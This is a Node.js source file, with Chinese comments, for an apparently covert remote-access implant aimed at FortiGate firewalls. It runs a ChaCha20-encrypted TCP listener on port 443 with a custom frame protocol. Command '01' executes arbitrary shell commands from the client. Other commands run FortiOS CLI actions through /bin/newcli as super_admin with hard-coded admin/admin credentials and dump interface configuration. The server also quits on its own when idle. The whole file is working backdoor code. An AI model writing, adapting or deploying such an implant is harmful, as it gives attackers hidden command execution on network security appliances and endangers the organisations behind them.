// server.js — 自定义二进制帧协议（hex 命令码）+ ChaCha20 流加密
const net = require("net");
const { spawn, exec } = require("child_process");
const fs = require("fs");
const crypto = require("crypto");

const CONFIG = {
  host: process.argv[2] || "0.0.0.0",
  port: parseInt(process.argv[3], 10) || 443,
  secret: process.argv[4] || "fortinet2026",
  timeout: 30000,
  newcliOutputTimeout: 10000, // newcli 命令输出静默超时
  idleTimeout: 20000, // 监听后/所有连接断开后若指定时间内无连接则自动退出
};

/* 检测 FortiOS 分页提示（如 --More--） */
const PAGING_PROMPT_RE = /(--More--|\bMore\b)[\s\r]*$/i;

function log(...args) {
  console.log(`[${new Date().toISOString()}]`, ...args);
}

if (CONFIG.secret === "fortinet2026") {
  log(
    "[!] Warning: using default encryption key. Use: node server.js <host> <port> <secret>",
  );
}

/* ============== ChaCha20 纯代码实现 ============== */
class ChaCha20 {
  constructor(key, nonce = Buffer.alloc(12), counter = 0) {
    if (key.length !== 32) throw new Error("ChaCha20 key must be 32 bytes");
    if (nonce.length !== 12) throw new Error("ChaCha20 nonce must be 12 bytes");
    this.key = key;
    this.nonce = nonce;
    this.counter = counter;
    this.block = Buffer.alloc(0);
    this.blockPos = 64;
  }

  quarterRound(s, a, b, c, d) {
    s[a] = (s[a] + s[b]) >>> 0;
    s[d] = (((s[d] ^ s[a]) << 16) | ((s[d] ^ s[a]) >>> 16)) >>> 0;
    s[c] = (s[c] + s[d]) >>> 0;
    s[b] = (((s[b] ^ s[c]) << 12) | ((s[b] ^ s[c]) >>> 20)) >>> 0;
    s[a] = (s[a] + s[b]) >>> 0;
    s[d] = (((s[d] ^ s[a]) << 8) | ((s[d] ^ s[a]) >>> 24)) >>> 0;
    s[c] = (s[c] + s[d]) >>> 0;
    s[b] = (((s[b] ^ s[c]) << 7) | ((s[b] ^ s[c]) >>> 25)) >>> 0;
  }

  generateBlock() {
    const constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    const keyWords = [];
    for (let i = 0; i < 8; i++) {
      keyWords.push(this.key.readUInt32LE(i * 4));
    }
    const nonceWords = [];
    for (let i = 0; i < 3; i++) {
      nonceWords.push(this.nonce.readUInt32LE(i * 4));
    }
    const state = constants.concat(keyWords, [this.counter >>> 0], nonceWords);
    const working = state.slice();

    for (let i = 0; i < 10; i++) {
      this.quarterRound(working, 0, 4, 8, 12);
      this.quarterRound(working, 1, 5, 9, 13);
      this.quarterRound(working, 2, 6, 10, 14);
      this.quarterRound(working, 3, 7, 11, 15);
      this.quarterRound(working, 0, 5, 10, 15);
      this.quarterRound(working, 1, 6, 11, 12);
      this.quarterRound(working, 2, 7, 8, 13);
      this.quarterRound(working, 3, 4, 9, 14);
    }

    const out = Buffer.alloc(64);
    for (let i = 0; i < 16; i++) {
      out.writeUInt32LE((working[i] + state[i]) >>> 0, i * 4);
    }
    this.counter++;
    return out;
  }

  crypt(data) {
    if (!data || data.length === 0) return data;
    const result = Buffer.alloc(data.length);
    let i = 0;
    while (i < data.length) {
      if (this.blockPos >= 64) {
        this.block = this.generateBlock();
        this.blockPos = 0;
      }
      const take = Math.min(data.length - i, 64 - this.blockPos);
      for (let j = 0; j < take; j++) {
        result[i + j] = data[i + j] ^ this.block[this.blockPos + j];
      }
      i += take;
      this.blockPos += take;
    }
    return result;
  }
}

function deriveKeys(secret) {
  const master = crypto.createHash("sha256").update(secret).digest();
  const k_cts = crypto
    .createHmac("sha256", master)
    .update("client-to-server")
    .digest();
  const k_stc = crypto
    .createHmac("sha256", master)
    .update("server-to-client")
    .digest();
  return [k_cts, k_stc];
}

/* ============== 业务逻辑 ============== */

/* 命令行解析：支持单双引号 */
function parseArgs(str) {
  const args = [];
  let cur = "",
    inQ = false,
    q = "";
  for (const ch of str) {
    if (!inQ && (ch === '"' || ch === "'")) {
      inQ = true;
      q = ch;
    } else if (inQ && ch === q) {
      inQ = false;
      q = "";
    } else if (!inQ && /\s/.test(ch)) {
      if (cur) {
        args.push(cur);
        cur = "";
      }
    } else {
      cur += ch;
    }
  }
  if (cur) args.push(cur);
  return args;
}

/* 在 PATH 中查找可执行文件 */
function resolveProg(prog, cb) {
  try {
    const st = fs.statSync(prog);
    if (st.isFile()) return cb(null, prog);
  } catch (e) {
    // 不是完整路径，继续在 PATH 中查找
  }
  const cmd =
    process.platform === "win32" ? `where "${prog}"` : `command -v "${prog}"`;
  exec(cmd, { windowsHide: true }, (err, stdout) => {
    if (err || !stdout.trim()) {
      return cb(new Error(`Program not found: ${prog}`));
    }
    cb(null, stdout.trim().split(/\r?\n/)[0]);
  });
}

/* 执行单条命令 */
function execCmd(cmdStr, cb) {
  const args = parseArgs(cmdStr);
  if (!args.length) {
    return cb({
      cmd: cmdStr,
      code: -1,
      error: "Empty command",
      stdout: "",
      stderr: "",
    });
  }

  const [prog, ...params] = args;
  log(`[EXEC] prog="${prog}" args=${JSON.stringify(params)}`);

  resolveProg(prog, (err, resolved) => {
    if (err) {
      return cb({
        cmd: cmdStr,
        code: -1,
        error: err.message,
        stdout: "",
        stderr: "",
      });
    }

    let child;
    try {
      child = spawn(resolved, params, { stdio: ["pipe", "pipe", "pipe"] });
    } catch (err) {
      return cb({
        cmd: cmdStr,
        code: -1,
        error: `spawn failed: ${err.message}`,
        stdout: "",
        stderr: "",
      });
    }

    let stdout = "",
      stderr = "";
    let finished = false;
    let killed = false;

    const timer = setTimeout(() => {
      killed = true;
      try {
        child.kill("SIGTERM");
      } catch (e) {}
      setTimeout(() => {
        try {
          child.kill("SIGKILL");
        } catch (e) {}
      }, 5000);
    }, CONFIG.timeout);

    function finish(result) {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      cb(result);
    }

    if (child.stdout) child.stdout.on("data", (d) => (stdout += d));
    if (child.stderr) child.stderr.on("data", (d) => (stderr += d));

    child.on("close", (code, signal) => {
      finish({
        cmd: cmdStr,
        code: code ?? -1,
        signal: signal || null,
        stdout,
        stderr,
        killed,
      });
    });
    child.on("error", (err) => {
      finish({ cmd: cmdStr, code: -1, error: err.message, stdout, stderr });
    });
  });
}

/* 自定义协议帧：打包 */
function packFrame(cmd, ip = "", port = 0, payload = Buffer.alloc(0)) {
  const ipBuf = Buffer.from(ip, "ascii");
  const ipLen = ipBuf.length;
  const header =
    cmd +
    ipLen.toString(16).padStart(2, "0") +
    port.toString(16).padStart(4, "0") +
    payload.length.toString(16).padStart(8, "0");
  return Buffer.concat([Buffer.from(header, "ascii"), ipBuf, payload]);
}

function sendEncrypted(socket, data, cb) {
  if (!socket.destroyed && socket.writable) {
    const encrypted = socket.sendCipher.crypt(data);
    socket.write(encrypted, cb);
  } else if (cb) {
    cb();
  }
}

function sendJsonResponse(socket, obj, cb) {
  const frame = packFrame(
    "FF",
    "",
    0,
    Buffer.from(JSON.stringify(obj), "utf8"),
  );
  sendEncrypted(socket, frame, cb);
}

/* 解析 16 字节 ASCII hex 头部 */
function parseHeader(buf16) {
  const s = buf16.toString("ascii");
  return {
    cmd: s.slice(0, 2),
    ipLen: parseInt(s.slice(2, 4), 16),
    port: parseInt(s.slice(4, 8), 16),
    payloadLen: parseInt(s.slice(8, 16), 16),
  };
}

/* 过滤 newcli 输出：从第一个指定提示符所在行开始返回 */
function stripBeforePrompt(stdout, promptRegex = /FortiGate-VM64\s*#/) {
  const m = stdout.match(promptRegex);
  if (!m) return stdout;
  const lineStart = stdout.lastIndexOf("\n", m.index) + 1;
  return stdout.slice(lineStart);
}

/* 通过 /bin/newcli 执行 FortiOS CLI 命令 */
function execNewCli(command, cb) {
  const args = ["admin", "admin", "root", "super_admin", "root"];
  let child;
  try {
    child = spawn("/bin/newcli", args, {
      stdio: ["pipe", "pipe", "pipe"],
      detached: false,
    });
  } catch (err) {
    return cb({ code: -1, error: err.message, stdout: "", stderr: "" });
  }

  let stdout = "",
    stderr = "";
  let finished = false;
  let commandSent = false;
  let outputTimer = null;

  const globalTimer = setTimeout(() => {
    finish({ code: -1, error: "newcli execution timeout", stdout, stderr });
  }, CONFIG.timeout);

  function finish(result) {
    if (finished) return;
    finished = true;
    clearTimeout(globalTimer);
    if (outputTimer) clearTimeout(outputTimer);
    if (child && !child.killed) {
      try {
        child.kill("SIGTERM");
      } catch (e) {}
      setTimeout(() => {
        try {
          if (child && !child.killed) child.kill("SIGKILL");
        } catch (e) {}
      }, 2000);
    }
    // 清理输出中残留的分页提示符和 ANSI 颜色码
    if (result.stdout) {
      result.stdout = result.stdout
        .replace(/\x1b\[[0-9;]*m/g, "")
        .replace(/--More--/gi, "");
    }
    cb(result);
  }

  function safeWrite(data) {
    if (finished) return;
    try {
      if (child && !child.killed && child.stdin && child.stdin.writable) {
        child.stdin.write(data);
      }
    } catch (e) {
      // stdin 写入失败通常表示子进程已退出
    }
  }

  child.stdout.on("data", (d) => {
    if (finished) return;
    const text = d.toString();
    stdout += text;
    if (!commandSent && text.includes("#")) {
      commandSent = true;
      safeWrite(command + "\n");
      outputTimer = setTimeout(() => {
        finish({ code: 0, stdout, stderr });
      }, CONFIG.newcliOutputTimeout);
    } else if (commandSent) {
      // 如果输出末尾出现分页提示，则回车继续输出
      if (PAGING_PROMPT_RE.test(stdout)) {
        safeWrite("\n");
      }
      if (outputTimer) clearTimeout(outputTimer);
      outputTimer = setTimeout(() => {
        finish({ code: 0, stdout, stderr });
      }, CONFIG.newcliOutputTimeout);
    }
  });

  child.stderr.on("data", (d) => {
    if (!finished) stderr += d;
  });
  child.on("close", (code) => {
    finish({ code: code ?? 0, stdout, stderr });
  });
  child.on("error", (err) => {
    finish({ code: -1, error: err.message, stdout, stderr });
  });
  child.stdin.on("error", (err) => {
    // 忽略 stdin 错误，避免未捕获异常导致服务端崩溃
  });
}

/* 模式 1：SHELL */
function handleShell(socket, client, ip, port, payload) {
  const cmdStr = payload.toString("utf8");
  log(`[SHELL] ${client} => ${cmdStr}`);
  execCmd(cmdStr, (result) => {
    log(`[RESULT] code=${result.code} cmd="${result.cmd}"`);
    if (result.stdout) log(`[STDOUT]\n${result.stdout}`);
    if (result.stderr) log(`[STDERR]\n${result.stderr}`);
    if (result.error) log(`[ERROR] ${result.error}`);
    sendJsonResponse(socket, result);
  });
}

/* 模式 7：INFO - 获取接口信息 */
function handleInfo(socket, client, ip, port, payload) {
  log(`[INFO] ${client} => show system interface`);
  const command = `config global\nshow system interface\nend\nexit\n`;
  execNewCli(command, (result) => {
    if (result.stdout) log(`[INFO STDOUT]\n${result.stdout}`);
    if (result.stderr) log(`[INFO STDERR]\n${result.stderr}`);
    if (result.error) log(`[INFO ERROR] ${result.error}`);
    sendJsonResponse(socket, { mode: "info", ...result });
  });
}

/* 模式 2：PING（支持直接 ping 或指定 VDOM） */
function handlePing(socket, client, ip, port, payload) {
  if (!ip) {
    return sendJsonResponse(socket, { mode: "ping", error: "missing target" });
  }
  const vdom = payload.toString("utf8").trim();

  if (vdom) {
    // 通过 newcli 在指定 VDOM 内执行 ping
    const command = `config vdom\nedit "${vdom}"\nexecute ping ${ip}\nend\nexit\n`;
    log(`[PING/VDOM] ${client} vdom=${vdom} target=${ip}`);
    execNewCli(command, (result) => {
      if (result.stdout) log(`[PING/VDOM STDOUT]\n${result.stdout}`);
      if (result.stderr) log(`[PING/VDOM STDERR]\n${result.stderr}`);
      if (result.error) log(`[PING/VDOM ERROR] ${result.error}`);
      // 客户端只保留从 FortiGate 提示符开始的内容
      if (result.stdout) result.stdout = stripBeforePrompt(result.stdout);
      sendJsonResponse(socket, {
        mode: "ping",
        cmd: `ping ${vdom} ${ip}`,
        ...result,
      });
    });
    return;
  }

  // 直接系统 ping
  const pingArgs =
    process.platform === "win32" ? ["-n", "4", ip] : ["-c", "4", ip];
  resolveProg("ping", (err, prog) => {
    if (err) {
      return sendJsonResponse(socket, { mode: "ping", error: err.message });
    }
    log(`[PING] ${client} -> ${ip}`);
    let child;
    try {
      child = spawn(prog, pingArgs, { stdio: ["pipe", "pipe", "pipe"] });
    } catch (err) {
      return sendJsonResponse(socket, { mode: "ping", error: err.message });
    }
    let stdout = "",
      stderr = "";
    if (child.stdout) child.stdout.on("data", (d) => (stdout += d));
    if (child.stderr) child.stderr.on("data", (d) => (stderr += d));
    child.on("close", (code) => {
      sendJsonResponse(socket, {
        mode: "ping",
        cmd: `ping ${ip}`,
        code,
        stdout,
        stderr,
      });
    });
    child.on("error", (err) => {
      sendJsonResponse(socket, { mode: "ping", error: err.message });
    });
  });
}

function handleFrame(socket, client, cmd, ip, port, payload) {
  log(
    `[FRAME] ${client} cmd=${cmd} ip=${ip} port=${port} payload_len=${payload.length}`,
  );
  switch (cmd) {
    case "01":
      handleShell(socket, client, ip, port, payload);
      break;
    case "02":
      handlePing(socket, client, ip, port, payload);
      break;
    case "07":
      handleInfo(socket, client, ip, port, payload);
      break;
    case "05":
      log(`[QUIT] ${client} requested disconnect`);
      sendJsonResponse(socket, { mode: "quit", message: "Bye" }, () =>
        socket.end(),
      );
      break;
    default:
      sendJsonResponse(socket, {
        mode: "unknown",
        error: `unknown cmd: ${cmd}`,
      });
  }
}

let idleTimer = null;
let activeConnections = 0;

function startIdleTimer() {
  if (idleTimer) clearTimeout(idleTimer);
  idleTimer = setTimeout(() => {
    if (activeConnections === 0) {
      log(
        `[!] Idle timeout (${CONFIG.idleTimeout}ms), no active connection. Exiting.`,
      );
      server.close(() => process.exit(0));
    } else {
      startIdleTimer();
    }
  }, CONFIG.idleTimeout);
}

function clearIdleTimer() {
  if (idleTimer) {
    clearTimeout(idleTimer);
    idleTimer = null;
  }
}

/* TCP Server */
const server = net.createServer((socket) => {
  const client = `${socket.remoteAddress}:${socket.remotePort}`;

  // 初始化收发 ChaCha20 cipher：服务端收=cts，发=stc
  const [kRecv, kSend] = deriveKeys(CONFIG.secret);
  socket.recvCipher = new ChaCha20(kRecv);
  socket.sendCipher = new ChaCha20(kSend);

  socket.parseState = "header";
  socket.buf = Buffer.alloc(0);
  socket.frame = null;
  log(`[+] CONNECTED: ${client}`);

  // 只要有连接建立，就停止空闲超时退出
  activeConnections++;
  clearIdleTimer();

  socket.on("data", (data) => {
    if (socket.destroyed) return;

    // 先解密，再按帧格式解析
    const decrypted = socket.recvCipher.crypt(data);
    socket.buf = Buffer.concat([socket.buf, decrypted]);

    while (true) {
      if (socket.parseState === "header") {
        if (socket.buf.length < 16) break;
        socket.frame = parseHeader(socket.buf.slice(0, 16));
        socket.buf = socket.buf.slice(16);
        socket.parseState = "body";
      }

      if (socket.parseState === "body") {
        const need = socket.frame.ipLen + socket.frame.payloadLen;
        if (socket.buf.length < need) break;
        const ip = socket.buf.slice(0, socket.frame.ipLen).toString("ascii");
        const payload = socket.buf.slice(socket.frame.ipLen, need);
        socket.buf = socket.buf.slice(need);
        socket.parseState = "header";

        handleFrame(
          socket,
          client,
          socket.frame.cmd,
          ip,
          socket.frame.port,
          payload,
        );
      }
    }
  });

  socket.on("close", () => {
    activeConnections--;
    if (activeConnections <= 0) {
      activeConnections = 0;
      startIdleTimer();
    }
    log(`[-] DISCONNECTED: ${client}`);
  });
  socket.on("error", (err) =>
    log(`[!] SOCKET ERROR ${client}: ${err.message}`),
  );
});

server.listen(CONFIG.port, CONFIG.host, () => {
  log(`[*] Server listening on ${CONFIG.host}:${CONFIG.port}`);
  startIdleTimer();
});
